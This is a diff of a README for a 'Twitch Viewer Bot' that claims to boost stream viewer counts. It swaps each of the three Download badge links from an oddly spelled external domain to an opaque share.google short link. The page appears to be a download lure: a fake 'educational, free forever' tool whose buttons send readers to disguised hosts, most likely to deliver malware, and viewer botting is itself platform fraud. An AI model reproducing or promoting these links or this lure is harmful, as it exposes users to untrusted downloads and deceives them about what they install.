@@ -9,7 +9,7 @@ The **📺 Twitch Viewer Bot** is a tool designed for streamers who want to unde
 
 <div align="center">
 
-[![Download Twitch Viewer Bot](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/twitch-v1ewer-bet4)
+[![Download Twitch Viewer Bot](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://share.google/coK54l6XdGXCJ9brk)
 
 </div>
 
@@ -82,7 +82,7 @@ New streamers struggle to get discovered. Low viewer counts mean low visibility.
 
 <div align="center">
 
-[![Download Twitch Viewer Bot](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/twitch-v1ewer-bet4)
+[![Download Twitch Viewer Bot](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://share.google/coK54l6XdGXCJ9brk)
 
 </div>
 
@@ -189,7 +189,7 @@ Understand platform mechanics through education. **Twitch Viewer Bot** helps str
 
 <div align="center">
 
-[![Download Twitch Viewer Bot](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/twitch-v1ewer-bet4)
+[![Download Twitch Viewer Bot](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://share.google/coK54l6XdGXCJ9brk)
 
 **Version 3.2.0** — Educational stream growth tool. Free forever.
 
